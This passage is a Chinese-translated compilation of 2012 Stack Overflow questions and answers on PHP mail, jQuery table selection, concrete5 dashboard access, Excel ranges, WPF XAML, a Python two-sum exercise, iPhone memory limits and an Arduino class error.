$to = "recipient@example.com";
$subject = "Random Selected Text";
$body = "<p><center><b>The Randomly Selected Text is:</b></p><b>" . $r_array[0] . "All done, echoing results.";
if (mail($to, $subject, $body)) {
  echo("<p>Message successfully sent!</p>");
} else {
   echo("<p>Message delivery failed...</p>");
 }
?> 
```

这样的事情应该可以工作，如果没有，邮件服务器可能没有在 Web 服务器上正确配置。

# jquery - jquery 单元格选择开始为更多单元格创建行跨度

> ID：10991296
> 
> 赞同：1
> 
> 时间：2012-06-12T06:04:06.347
> 
> 标签：jquery, html, css

[见小提琴](http://jsfiddle.net/Cyjye/13/)

首先，我是 jquery 的新手。

我必须只选择一个单元格`#tableAppointment tbody tr td:nth-child(2)` ，文本框值应该转到选择开始的下一个单元格。

我在我的小提琴中制作了功能，但文本框值转到所有单元格。我必须将文本框值设置为第一个单元格，其他单元格为行跨度（意味着用户只能看到所有单元格选择的一个文本框值）。为了在下一个单元格中获取值，我采用了 html 的跨度标签，但我不想要跨度标签。

```
//ONE cell selection code
var active = false;

            $('#tableAppointment tbody tr td:nth-child(2)').mousedown(function (ev)
            {
                active = true;
                $(".csstdhighlight").removeClass("csstdhighlight"); // clear previous selection
                ev.preventDefault(); // this prevents text selection from happening
                $(this).addClass("csstdhighlight");
                $(this).addClass("temp_selected");
            });

            $('#tableAppointment tbody tr td:nth-child(2)').mousemove(function (ev)
            {
                if (active)
                {
                    $(this).addClass("csstdhighlight");
                    $(this).addClass("temp_selected");
                }
                if ($('.temp_selected').length == 3)
                {
                    return false;
                }
                if ($('.temp_selected').length > 3)
                {
                    alert("Time slot not more than 30 minutes.");
                    $(this).removeClass("csstdhighlight");
                    $(this).removeClass("temp_selected");
                    return false;
                }
            });

            $(document).mouseup(function (ev)
            {
                active = false;
                $('.temp_selected').removeClass('.temp_selected');

            }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:05:59.640

我想你正在寻找这样的东西：

```
jQuery('#update').click(function() {
    var cells=$('#tableAppointment tbody tr td:nth-child(3)');
    var i=0;
    var topcell=false;
    cells.each(function() {
        var $cell = $(this);

        if ($cell.hasClass('csstdhighlight')) {
            if(i==0){
                $cell.find('span').text(jQuery('#patientNames').val());
                topcell=$cell;
            }else{
               $cell.remove();
            }
            i++;
        }
    });
    if(topcell) topcell.attr('rowspan',i);
});​ 
```

# security - 如何从域中删除 cms 仪表板登录页面

> ID：10991300
> 
> 赞同：0
> 
> 时间：2012-06-12T06:04:25.150
> 
> 标签：security, concrete5

我有几个域在 CMS 的单个实例下运行。

www.domain.ru - 俄语
www.domain.com - 英语
www.domain.it - 意大利

在路径上工作的内容编辑器：www.otherdomain.com/dashboard，此域仅限于某个 url。

但是，我想阻止人们访问 www.domain.ru/dashboard 或 www.domain.com/dashboard。

无论如何要这样做吗？我只是想通过尝试使用机器人登录来最大程度地降低风险。

**编辑**
这是我的 css 文件

```
# -- concrete5 urls start --
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME}/index.html !-f
RewriteCond %{REQUEST_FILENAME}/index.php !-f
RewriteRule . index.php [L]
</IfModule>
# -- concrete5 urls end -- 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T10:51:04.830

为什么不使用 htaccess 文件来阻止对仪表板页面的访问？

# excel - 查找范围内的列

> ID：10991303
> 
> 赞同：1
> 
> 时间：2012-06-12T06:04:55.000
> 
> 标签：excel, vba, vsto, excel-interop

是否有可能知道在给定列的范围内存在哪些列，例如“A：C”有A、B和C列，例如“G：K”有G、H、I、J和K列，对于“ Z:AC" 有 Z,AA,AB 和 AC

我正在使用 C# 和 com iterop

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:13:26.593

您可以尝试使用字母作为基数 26 的数字。这将有助于找到 AA 或 AZ 或 A 的位置。希望这会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:34:37.780

试试这个

```
object misValue = System.Reflection.Missing.Value;   
'
'
'
xlRange = xlWorkSheet.get_Range("A1:C10", misValue);
int rw = xlRange.Cells[1, 1].Column;

for (int i = 1; i <= xlRange.Columns.Count; i++)
{
    MessageBox.Show(xlWorkSheet.Cells[1,rw].Address.Split('$')[1]);
    rw ++;
} 
```

# wpf - WPF 应用程序崩溃

> ID：10991308
> 
> 赞同：0
> 
> 时间：2012-06-12T06:05:46.123
> 
> 标签：wpf, xaml

我在框架上加载的 xaml 页面中有以下代码。当我加载此页面时应用程序崩溃并且调试告诉我在线上有错误`<Grid.Resources>`。请帮忙指出我哪里出错了

```
<Page x:Class="Milestones.Decade2"
      xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
      xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
      xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
      xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
      xmlns:s="http://schemas.microsoft.com/surface/2008"
      xmlns:debug="clr-namespace:System.Diagnostics;assembly=WindowsBase"
      mc:Ignorable="d" 
      d:DesignHeight="300" d:DesignWidth="300"
    Title="Decade2">
    <Grid DockPanel.Dock="Left" Width="Auto" Height="Auto" >

        <Grid.Resources>
            <!-- The DataTemplate for a <Milestone> element. -->
            <XmlDataProvider Source="Data/Decade2.xml" XPath="Milestones" x:Key="AllMilestones" IsInitialLoadEnabled="True"/>
            <DataTemplate DataType="Milestone" x:Key="Milestones">
                <StackPanel Orientation="Horizontal">
                    <TextBlock Text="{Binding XPath=@Name}" />
                </StackPanel>
            </DataTemplate>
            <DataTemplate DataType="Milestone" x:Key="View">
                <StackPanel FlowDirection="LeftToRight" Orientation="Horizontal">
                    <Image Source="{Binding XPath=./Media}" Width="250" Height="250" Grid.Column="0" />
                    <Canvas Grid.Column="1" Background="#0071bc" Height="Auto" >
                        <TextBlock TextWrapping="Wrap" Width="600">
                    <TextBlock TextWrapping="Wrap" FontSize="56" FontFamily="TitilliumText22L XBold" Text="{Binding XPath=@Name}" Padding="5" Foreground="White"  />
                    <TextBlock TextWrapping="Wrap" FontSize="42" FontFamily="TitilliumText22L" FontWeight="Bold" Text="{Binding XPath=./Introduction}"  Padding="5" Foreground="White"/>
                    <TextBlock TextWrapping="Wrap" FontSize="36" FontFamily="TitilliumText22L" Text="{Binding XPath=./Description}" Padding="5" Foreground="White" />
                   </TextBlock>
                    </Canvas>
                </StackPanel>
            </DataTemplate>

        </Grid.Resources>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <!-- The top row is for the ListBox. -->
            <RowDefinition Height="Auto" />
            <!-- The bottom row is for the Image. -->
            <RowDefinition Height="*" />
        </Grid.RowDefinitions>

        <s:SurfaceListBox Grid.Row="3" IsSynchronizedWithCurrentItem="True"  ItemsSource="Binding Source={StaticResource AllMilestones}, XPath=Milestones" ItemTemplate="{StaticResource Milestones}" Name="lstDecades2">
            <s:SurfaceListBox.ItemsPanel>
                <ItemsPanelTemplate>
                    <StackPanel Orientation="Horizontal"/>
                </ItemsPanelTemplate>
            </s:SurfaceListBox.ItemsPanel>
        </s:SurfaceListBox>

        <!-- Displays the selected person's photo and name. -->
        <DockPanel Grid.Row="1">
            <ScrollViewer>

                <ListBox Name="lbFiles" 
                 ItemsSource="{Binding ElementName=lstDecades2, Path=SelectedItem, UpdateSourceTrigger=PropertyChanged}"                      
                  />

            </ScrollViewer>
        </DockPanel>

        <Image Source="Resources/images/logo.jpg" Height="186" Grid.Column="0" Grid.Row="0"></Image>
    </Grid>
</Page> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T07:48:42.593

切换 Key 和 DataType 字段，错误是说您为相同的 DataType 添加了 2 个资源。

```
<DataTemplate  x:Key="Milestones" DataType="Milestone">
</DataTemplate>

<DataTemplate x:Key="View" DataType="Milestone">
</DataTemplate> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-13T12:51:29.333

我按照安迪的指示进行了更改，页面加载但列表框为空白。下面是代码和XML

```
 <Grid.Resources>
        <!-- The DataTemplate for a <Milestone> element. -->
        <XmlDataProvider Source="Data/Decade2.xml" XPath="Milestones" x:Key="AllMilestones" IsInitialLoadEnabled="True"/>
        <DataTemplate x:Key="Milestones" DataType="Milestone" >

                <TextBlock Text="{Binding XPath=@Name}" />

        </DataTemplate>
        <DataTemplate x:Key="View" DataType="View" >
            <StackPanel FlowDirection="LeftToRight" Orientation="Horizontal">
                <Image Source="{Binding XPath=./Media}" Width="250" Height="250" Grid.Column="0" />
                <Canvas Grid.Column="1" Background="#0071bc" Height="Auto" >
                    <TextBlock TextWrapping="Wrap" Width="600">
                <TextBlock TextWrapping="Wrap" FontSize="56" FontFamily="TitilliumText22L XBold" Text="{Binding XPath=@Name}" Padding="5" Foreground="White"  />
                <TextBlock TextWrapping="Wrap" FontSize="42" FontFamily="TitilliumText22L" FontWeight="Bold" Text="{Binding XPath=./Introduction}"  Padding="5" Foreground="White"/>
                <TextBlock TextWrapping="Wrap" FontSize="36" FontFamily="TitilliumText22L" Text="{Binding XPath=./Description}" Padding="5" Foreground="White" />
               </TextBlock>
                </Canvas>
            </StackPanel>
        </DataTemplate>

    </Grid.Resources>
    <Grid.RowDefinitions>
        <RowDefinition Height="Auto"/>
        <!-- The top row is for the ListBox. -->
        <RowDefinition Height="Auto" />
        <!-- The bottom row is for the Image. -->
        <RowDefinition Height="*" />
    </Grid.RowDefinitions>

    <s:SurfaceListBox Grid.Row="3" IsSynchronizedWithCurrentItem="True"  ItemsSource="Binding Source={StaticResource AllMilestones}, XPath=Milestones" ItemTemplate="{StaticResource Milestones}" Name="lstDecades2">
        <s:SurfaceListBox.ItemsPanel>
            <ItemsPanelTemplate>
                <StackPanel Orientation="Horizontal"/>
            </ItemsPanelTemplate>
        </s:SurfaceListBox.ItemsPanel>
    </s:SurfaceListBox>

    <!-- Displays the selected person's photo and name. -->
    <DockPanel Grid.Row="1">
        <ScrollViewer>

            <ListBox Name="lbFiles" 
             ItemsSource="{Binding ElementName=lstDecades2, Path=SelectedItem, UpdateSourceTrigger=PropertyChanged}"                      
              />

        </ScrollViewer>
    </DockPanel>

    <Image Source="Resources/images/logo.jpg" Height="186" Grid.Column="0" Grid.Row="0"></Image>
</Grid> 
```

XML

```
<Milestones>
  <Milestone Name="1987">
    <View>
      <Media></Media>
      <MediaDescription></MediaDescription>
      <Introduction></Introduction>
      <Description></Description>
    </View>
    <View>
      <Media></Media>
      <MediaDescription></MediaDescription>
      <Introduction></Introduction>
      <Description></Description>
    </View>
  </Milestone>
<Milestone Name="1988">
    <View>
      <Media></Media>
      <MediaDescription></MediaDescription>
      <Introduction></Introduction>
      <Description></Description>
    </View>
    <View>
      <Media></Media>
      <MediaDescription></MediaDescription>
      <Introduction></Introduction>
      <Description></Description>
    </View>
  </Milestone>
</Milestones> 
```

# python - 一圈？Python

> ID：10991311
> 
> 赞同：3
> 
> 时间：2012-06-12T06:06:17.327
> 
> 标签：python

所以我写了这个给定可能数字的函数，它必须在构成给定数字的可能数字中找到两个数字。但是，我仍在学习 Python（一种非常棒的语言），所以我只能使用有限的一组函数。

我创建了这个函数：

```
def sumPair(theList, n):

    theList = charCount(theList) #charCount is a function i made to convert the list into a dictionary
    for i in theList:
        for a,b in theList.iteritems():
            print a,b
            if a + i == n:
                if theList[b] > 1:
                    return [i, b]
                if a != i:
                    return [i, b]
        return "[]"
print sumPair([6,3,6,8,3,2,8,3,2], 11) 
```

就像我说的，它会找到两个加起来等于给定数字的数字。`charCount`是我编写的将数组添加到字典中的函数。

在这个程序中，我确保该值大于 1，以防添加的数字相同。有时，如果它检查 10 的总和并且你给它一个数字 5，它只会将 5 添加到自身并返回 10。这`if theList[b] > 1:` 就是存在的原因。

为什么我在这里？我的教练对两个循环不满意。我花了 5 个小时排除故障，但一无所获。我需要将此程序转换为单循环程序。

我花了一整天的时间，我不是想让你做我的功课，我只是真的被困住了，我需要你的帮助。我听说我应该检查是否存在密钥来完成这项工作。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T06:13:32.413

讲师可能不满意您的算法花费的时间比它必须的时间长。试试这个：

```
for each element x in theList
  if there exists an element y in theList such that x+y = n, you have a match 
```

您需要快速进行“如果存在”测试，这就是您使用字典的目的。一个循环将建立这个字典，第二个循环将搜索。这将花费线性时间与您的 O(n^2) 时间。

您关于 5 与自身匹配的观点是一个很好的观点。您想使用称为多重集或包的数据结构。阅读它，然后以这种方式实现您的代码：

```
for each element x in theList
  if there exists an element y in theList such that x+y == n:
    if x != y or (x == y and x occurs more than once):
      you have a match 
```

祝你好运。

*编辑*因为有很多次优解决方案，这里是简单的线性解决方案（它是线性的，因为列表中有 2 个循环，但循环一个接一个。所以，2*n 迭代，O(n)。它非常快。

```
#!/usr/bin/python2.6

from collections import defaultdict

def sum_list(l, n):
  count = defaultdict(lambda: 0)

  for x in l:      # O(n)
    count[x] += 1  # This can be done in constant time O(1)

  for x in l:      # O(n)
    y = n - x
    if count[y] > 0 and (x != y or count[y] > 1): # O(1)
      return x, y 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T07:04:35.003

您可以单独检查特殊情况。`n%2`意思是“n mod 2”所以它`0`是`n`偶数

```
def sumPair(theList, n):
    # If n is even, check whether n/2 occurs twice or more in theList
    if n%2 == 0 and theList.count(n/2) > 1:
        return [n/2, n/2]

    theSet = set(theList)
    for i in theSet:
        if n-i in theSet:
            return [i, n-i]
    return [] 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-12T06:58:21.507

*用铅笔和纸*，甚至只看纸上的数字行来思考问题总是有帮助的。然而，更好的解决方案一开始可能看起来*过于复杂*，而且它们的优势乍一看可能并不*那么明显*——请参阅[gnibbler 的解决方案](https://stackoverflow.com/a/10991886/1346705)（他的回答是我个人的赢家，见下文）。

首先，您需要将一个数字与其他所有数字进行比较。然后是第二个数字，以此类推。当使用天真的方法时，在使用单个处理器时无法避免两个嵌套循环。那么时间复杂度总是 O(n^2) 其中 n 是序列的长度。事实是，一些循环可能隐藏在操作中，`in`或者`list.index()`原则上不会使解决方案更好。

想象一下这些数字的笛卡尔积——它由一对数字组成。这样的对有 n^2 个，但就加法运算的交换性质而言，大约有一半是相同的，其中 n 个是有自身的对。这意味着您只需要检查`n^2 / 2 - n`对。如果它们适合测试，最好避免循环遍历不必要的对，而不是稍后进行测试：

```
for each first element in theList:
    for each second element in the rest of theList from the checked one on:
        if the first and the second elements give the solution:
            report the result
            possibly early break if only the first should be reported 
```

*对选中的列表的其余部分*使用切片，在`enumerate()`第一个（也可能在第二个）循环中使用 来了解索引。

尽量减少循环中的操作总是一个好主意。想想内循环体是做的次数最多的。这样您就可以在进入内部循环之前计算搜索到的数字：`searched = sum - first`. 然后第二个循环加上`if`可以替换为`if searched in the rest of theList:`

[在此处出现更完整的解决方案后编辑]

这是找到第一次出现或无的 O(n^2) 解决方案（纯 Python，简单，没有库，内置函数和切片，几行）：

```
def sumPair(theList, n):
    for index, e in enumerate(theList):     # to know the index for the slicing below
        complement = n - e                  # we are searching for the complement
        if complement in theList[index+1:]: # only the rest is searched
            return e, complement            

print sumPair([6,3,6,8,3,2,8,3,2], 11) 
```

[在 gnibbler 对切片和复制的评论之后添加]

gnibbler 关于切片是正确的。切片是副本。（问题是切片是否没有使用“写入时复制”技术进行优化——我不知道。如果是，那么切片将是一种廉价的操作。）为了避免复制，可以使用该`list.index()`方法进行测试允许传递起始索引。唯一*奇怪*`ValueError`的是，当找不到该项目时它会引发异常。这样，`if complement...`必须替换为`try ... except`：

```
def sumPair2(theList, n):
    for ind, e in enumerate(theList):
        try:
            theList.index(n - e, ind + 1)
            return e, n - e
        except ValueError:
            pass 
```

Gnibbler 的评论让我更多地思考这个问题。事实是，`set`可以接近 O(1) 来测试它是否包含元素和 O(n) 来构造集合。对于非数字元素（其中集合类型无法实现为位数组），这不是很清楚。当哈希数组发挥作用并且应该使用其他技术解决可能的冲突时，那么质量取决于实现。

如有疑问，请测量。这里 gnibbler 的解决方案稍作修改，与其他解决方案相同：

```
import timeit

def sumPair(theList, n):
    for index, e in enumerate(theList):
        if n - e in theList[index+1:]:
            return e, n - e

def sumPair2(theList, n):
    for ind, e in enumerate(theList):
        try:
            theList.index(n - e, ind + 1)
            return e, n - e
        except ValueError:
            pass

def sumPair_gnibbler(theList, n):
    # If n is even, check whether n/2 occurs twice or more in theList
    if n%2 == 0 and theList.count(n/2) > 1:
        return n/2, n/2

    theSet = set(theList)
    for e in theSet:
        if n - e in theSet:
            return e, n - e 
```

问题中的原始数字用于第一次测试。`n = 1`无法找到解决方案时的最坏情况的原因：

```
theList = [6,3,6,8,3,2,8,3,2]

n = 11
print '---------------------', n
print sumPair(theList, n), 
print timeit.timeit('sumPair(theList, n)', 'from __main__ import sumPair, theList, n', number = 1000)

print sumPair2(theList, n), 
print timeit.timeit('sumPair2(theList, n)', 'from __main__ import sumPair2, theList, n', number = 1000)

print sumPair_gnibbler(theList, n),
print timeit.timeit('sumPair_gnibbler(theList, n)', 'from __main__ import sumPair_gnibbler, theList, n', number = 1000)

n = 1
print '---------------------', n
print sumPair(theList, n), 
print timeit.timeit('sumPair(theList, n)', 'from __main__ import sumPair, theList, n', number = 1000)

print sumPair2(theList, n), 
print timeit.timeit('sumPair2(theList, n)', 'from __main__ import sumPair2, theList, n', number = 1000)

print sumPair_gnibbler(theList, n),
print timeit.timeit('sumPair_gnibbler(theList, n)', 'from __main__ import sumPair_gnibbler, theList, n', number = 1000) 
```

它在我的控制台上产生以下输出：

```
--------------------- 11
(3, 8) 0.00180958639191
(3, 8) 0.00594907526295
(8, 3) 0.00124991060067
--------------------- 1
None 0.00502748219333
None 0.026334041968
None 0.00150958864789 
```

从那短的数字序列和一个特殊情况来看，就时间复杂度而言，不可能说任何质量。无论如何，gnibbler 的解决方案赢了。

在序列包含唯一值的情况下，gnibbler 的解决方案使用最多的内存。让我们尝试更长的序列，包含 0、1、2、...、9999。n 等于 11 和 3000 代表有解决方案的任务。对于 n 等于 30000 的情况，无法找到这对数字。必须检查所有元素——最坏的情况：

```
theList = range(10000)

n = 11
print '---------------------', n
print sumPair(theList, n), 
print timeit.timeit('sumPair(theList, n)', 'from __main__ import sumPair, theList, n', number = 100)

print sumPair2(theList, n), 
print timeit.timeit('sumPair2(theList, n)', 'from __main__ import sumPair2, theList, n', number = 100)

print sumPair_gnibbler(theList, n),
print timeit.timeit('sumPair_gnibbler(theList, n)', 'from __main__ import sumPair_gnibbler, theList, n', number = 100)

n = 3000
print '---------------------', n
print sumPair(theList, n), 
print timeit.timeit('sumPair(theList, n)', 'from __main__ import sumPair, theList, n', number = 100)

print sumPair2(theList, n), 
print timeit.timeit('sumPair2(theList, n)', 'from __main__ import sumPair2, theList, n', number = 100)

print sumPair_gnibbler(theList, n),
print timeit.timeit('sumPair_gnibbler(theList, n)', 'from __main__ import sumPair_gnibbler, theList, n', number = 100)

n = 30000
print '---------------------', n
print sumPair(theList, n), 
print timeit.timeit('sumPair(theList, n)', 'from __main__ import sumPair, theList, n', number = 100)

print sumPair2(theList, n), 
print timeit.timeit('sumPair2(theList, n)', 'from __main__ import sumPair2, theList, n', number = 100)

print sumPair_gnibbler(theList, n),
print timeit.timeit('sumPair_gnibbler(theList, n)', 'from __main__ import sumPair_gnibbler, theList, n', number = 100) 
```

请注意，序列要长得多。该测试仅重复 100 次，以便在合理的时间内获得结果。（除非您将时间除以 ，否则无法将时间与之前的测试进行比较`number`。）它在我的控制台上显示以下内容：

```
--------------------- 11
(0, 11) 0.00840137682165
(0, 11) 0.00015695881967
(0, 11) 0.089894683992
--------------------- 3000
(0, 3000) 0.0166750746034
(0, 3000) 0.00966040735374
(0, 3000) 0.12532849753
--------------------- 30000
None 180.328006493
None 163.651082944
None 0.204691100723 
```

在非最坏情况下，gnibbler 的解决方案似乎很慢。原因是它需要经历所有序列的准备阶段。幼稚的解决方案在大约三分之一的第一遍中找到了数字。能说明一切的是最坏的情况。gnibbler 的解决方案大约快 1000 倍，并且对于更长的序列，差异会增加。 **Gnibbler 的解决方案显然是赢家。**

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-12T06:19:47.547

我的评论：

*   如果将列表转换为字典，请将名称从更改为`theList`其他名称。`theList`有一个名为保存字典的变量是令人困惑的。

*   如果这两个数字总是彼此相邻，您可以尝试编写一个循环，将索引变量设置`i`为 0，然后递增`i`，检查是否`theList[i] + theList[i + 1]`等于所需的数字。

*   如果这两个数字可能找不到彼此相邻，那就更棘手了。最明显的方法是使用两个循环：一个是依次查看每个数字，另一个是查看后面的数字，看它们是否与目标相加。如果这两个数字不必彼此相邻，并且讲师希望您只使用一个循环，那么您将需要使用一些东西来保存列表值（如字典）或可能使用“隐式环形”。

“隐式循环”是什么意思？Python 提供了一个运算符 ，`in`它会告诉你一个对象是否在 Python 列表中。这是通过循环遍历列表来工作的，但是您不编写循环；循环是在 Python 中为您完成的。

所以，你可以这样做：依次查看每个数字。从目标值中减去数字，然后用于`in`查看计算的值是否在列表的其余部分中。要搜索列表的其余部分并跳过当前值，请使用“列表切片”。如果您还没有学习切片，那么您的讲师可能不会寻找列表切片的答案。

这是一个例子。如果您已`i`设置为 0，并且您正在查看列表中的第一个条目，则值为 6。目标值为 11。因此计算的值为 (11 - 6) 或 5。然后您将检查是否`computed_value in theList`. 要仅查看列表的其余部分，您可以使用切片，然后您将拥有`computed_value in theList[1:]`. 如果你有一个索引变量`i`，你会有类似的东西`computed_value = 11 - theList[i]`，然后检查是否`computed_value in theList[i:]`.

*   不要忘记，可以使用`for`循环来创建从 0 到列表长度的索引，并使用索引索引到列表中。在 Python 中，通常最好使用`for x in lst:`which 集合`x`来表示列表中的连续对象，但有时您会遇到一个问题，即先使用`for i in xrange(len(lst)):`然后使用`lst[i]`or`lst[i+1]`或`lst[i:]`or 什么是有用的。

*   使用老师想要的任何编码风格。如果您的老师想要“theList”之类的“camelCase”名称，请执行此操作。但是 Python 的常用样式称为“PEP 8”，该样式中的变量名是带有下划线的小写字母，例如“the_list”。 [http://www.python.org/dev/peps/pep-0008/](http://www.python.org/dev/peps/pep-0008/)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-06-12T06:26:53.310

纯 python - 不使用库：

```
def combinations(lst):
    l = lst[:] # copy of source list
    while len(l) > 1:
        a = l.pop(0)
        for b in l:
           yield a,b

def first_pair(iterator):
    for i in iterator:
       # just return first element
       return i

def sum_pair(lst, sum_val):
    return first_pair((a,b) for a,b in combinations(lst) if (a+b) == sum_val)

print sum_pair([6,3,6,8,3,2,8,3,2], 11)
# result (3,8) 
```

使用迭代工具：

```
from itertools import combinations, islice

def sum_pair(lst, sum_val):
    return list(islice(((a,b)
        for a,b in combinations(lst, 2) if (a+b) == sum_val), 0, 1))

print sum_pair([6,3,6,8,3,2,8,3,2], 11)
# result [(3,8)] 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-06-12T08:05:58.653

这是一个非常好的问题，我曾经被问过一种方法来在线性时间和恒定空间中做到这一点，直到今天我不知道如何实现这一点。

这是一个简单的实现，我确定有一种方法可以使用缓存使它更快一点，但那是假设列表中的每个整数都不唯一，如果是，我认为缓存不会有帮助......

```
def get_sum_pairs(sum = None, list_of_numbers = None):
    assert sum != None and list_of_numbers != None
    list_of_numbers = sorted(list_of_numbers) # sort the list of numbers O(n log n)        
    for index, number in enumerate(list_of_numbers): # search for each number that is less than the sum O(n)
        if number < sum: # if number greater then sum, theres nothing we can do.
            for index, number_1 in enumerate(list_of_numbers[(index + 1):]): # search the second list, this isn't exactly O(n) since its incremented being incremented
                if number + number_1 == sum: # found a solution.
                    return [(number, number_1)]
                if (number_1 > sum) or (number + number_1 > sum): # if number greater then sum, theres nothing we can do.
                    break                                       # if the addition of two sorted numbers is greater then sum, then theres no need to keep searching since the rest will also be greater, since their sorted.
        else:
            break
    return [()] 
```

唯一的一种方法是使用某种数学公式或技巧，不幸的是我没有。

在测量运行时间时，我们在很大程度上考虑了最坏的情况，在这种情况下，它将是一个数字列表，其中每个数字都小于总和并且是唯一的。

所以有 n 个唯一数字都小于总和，通过排序我们可以减少检查次数，因为我们只需要向前移动 1 + 2 == 2 + 1 :) 但我们仍然需要检查 2 + 3, 3 + 4 依此类推...但还要注意，如果检查的总和大于给出总和，我们也可以停止，因为总和将增加... :)

这里有一些测试......

```
assert all([get_sum_pairs(**test[0]) == test[1] for test in
     [({'list_of_numbers':[6,3,6,8,3,2,8,3,2], 'sum':11}, [(3, 8)]),
     ({'list_of_numbers':[1,2,3,4,1,2], 'sum':1}, [()]),
     ({'list_of_numbers':[1,2,3,1,23,1,23,123], 'sum':124}, [(1, 123)]),
     ({'list_of_numbers':[1,2,3,12,3,2,1,23,4,1,23,4,5,12332], 'sum':14}, [(2, 12)]),
     ({'list_of_numbers':[-1,2,-2, -3, 1, 2, 3, 2, -1.3], 'sum':1}, [(-1, 2)])
     ] ]) 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-06-12T09:45:55.033

我不确定@samy.vilar 的“恒定空间”，但这是一个线性时间和空间的解决方案（与`n`虽然成比例而不是与`len(numbers)`）：

```
def sumpairs(numbers, n):
    numbers = [None] + numbers + [None] * (n-len(numbers))
    for k in range(len(numbers)):
        a = numbers[k]
        if a is None or a==k: continue
        if numbers[n-a]==n-a:
            return a, n-a
        numbers[k] = None
        while numbers[a] != a and a is not None:
            b = n-a
            if numbers[a] is None:
                numbers[a] = a
                break
            if numbers[b]==b:
                return a, n-a
            numbers[a], a = a, numbers[a]

print(sumpairs([6,3,6,8,3,2,8,3,2], 16))
print(sumpairs([6,3,6,8,3,2,8,3,2], 11))
print(sumpairs([6,3,5,8,3,2,8,3,2], 10))
print(sumpairs([6,3,5,8,3,2,8,3,2], 5))
print(sumpairs([6,3,5,8,3,2,8,3,2], 12)) # This should fail. 
```

它通过将每个数字移动到列表中的相应位置来工作（我添加了一个前导`None`以获得基于 1 的索引）。复杂性有点棘手：有一个嵌套循环，但由于每个数字的位置最多会改变一次，整个过程仍然是 O(n)。

`n`与数字列表的长度相比，该解决方案当然很糟糕。这是一个恒定空间的解决方案（如果您销毁输入，否则您需要它的单个副本）和 O(n log n) 时间，n 是输入的长度：

```
def sumpairs(numbers, n):
    numbers = sorted(numbers)
    low = 0
    while low < len(numbers)-1:
        t = numbers[low] + numbers[-1]
        if t > n:
            numbers.pop(-1)
        elif t < n:
            low += 1
        else:
            return numbers[low], numbers[-1]

print(sumpairs([6,3,6,8,3,2,8,3,2], 16))
print(sumpairs([6,3,6,8,3,2,8,3,2], 11))
print(sumpairs([6,3,5,8,3,2,8,3,2], 10))
print(sumpairs([6,3,5,8,3,2,8,3,2], 5))
print(sumpairs([6,3,5,8,3,2,8,3,2], 12)) # This should fail. 
```

# iphone - Xcode - Iphone 内存限制

> ID：10991313
> 
> 赞同：-2
> 
> 时间：2012-06-12T06:06:21.207
> 
> 标签：iphone, ios, xcode, xcode-instruments

一个应用程序可以使用的最大内存是多少？请找到带有此消息的仪器屏幕截图。这个真实内存和虚拟内存限制是什么？

![截屏](../Images/7d0a00acbe1d9a195a15fd32f1a8b3ce.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T05:40:05.017

我不认为我可以直接回答您的问题，但有一些想法：

1.  就可用物理 RAM 而言，正如您从[iPhone 型号的 Wikipedia 概览中](http://en.wikipedia.org/wiki/IPhone_models)看到的那样，原始 iPhone 和 3G 为 128MB，3G 为 256MB，4 和 4S 为 512MB。

2.  根据 Apple 的[iOS App Programming Guide](http://developer.apple.com/library/ios/#DOCUMENTATION/iPhone/Conceptual/iPhoneOSProgrammingGuide/TheiOSEnvironment/TheiOSEnvironment.html)，虚拟内存不是来自物理磁盘/存储的分页内存（就像您在桌面操作系统中看到的那样），所以我假设 iOS 只是将物理 RAM 作为虚拟内存分配给应用程序，更少由操作系统（和任何后台应用程序）消耗的。[此外，请参阅 Apple 在其内存使用性能指南](http://developer.apple.com/library/ios/#documentation/Performance/Conceptual/ManagingMemory/Articles/AboutMemory.html#//apple_ref/doc/uid/20001880-BCICIHAB)中对虚拟内存的讨论。

3.  最后，看到这个[SO帖子](https://stackoverflow.com/a/8540665/1271826)关于确定可用内存。作为数据点，在运行 iOS 5.1.1 的开发 3GS 上，该 SO 帖子中的算法报告了 ~228MB 总可用内存和 ~100MB 可用内存（在一个相当简单的故事板 ARC 测试项目中，有大量视图控制器，其中只有两个在测试可用内存时被积极使用）。如果这是任何迹象，看起来它产生了大部分物理 RAM，大概是为 SpringBoard 等 iOS 应用程序使用了一些内存。如果我在后台运行其他用户应用程序，我的测试应用程序报告的内存相应减少（总“可用”和“免费”......例如，在后台运行 Facebook，我损失了 20-30MB），但是如果我手动终止了其他应用程序，则内存已恢复并可用于我的内存测试应用程序。

最重要的是，看起来应用程序可用的内存似乎是（a）由设备的特定型号决定的物理 RAM 的函数；(b) 还有哪些其他应用程序仍在后台运行。

# c++ - 为 Arduino 编写自定义类时出现错误“未命名类型”

> ID：10991317
> 
> 赞同：1
> 
> 时间：2012-06-12T06:06:57.663
> 
> 标签：c++, arduino

为 Arduino 编写新库后，编译器无法识别这个新类并返回错误，

> BinaryCounter：15：错误：“二进制”未命名类型

以下是产生错误的文件。类在 中定义`Binary.h`、实现`Binary.cpp`和使用`BinaryCounter.ino`

二进制.h

```
#ifndef Binary_h
#define Binary_h

#include "Arduino.h"

class Binary {
  public:
    Binary (int pins[], int numPins);
    void display(int number);
    void clear();
  private:
    boolean *_values;
    int *_pins;
    int _numPins;
    void _update();
    void _setValues (int num);
};

#endif 
```

二进制文件

```
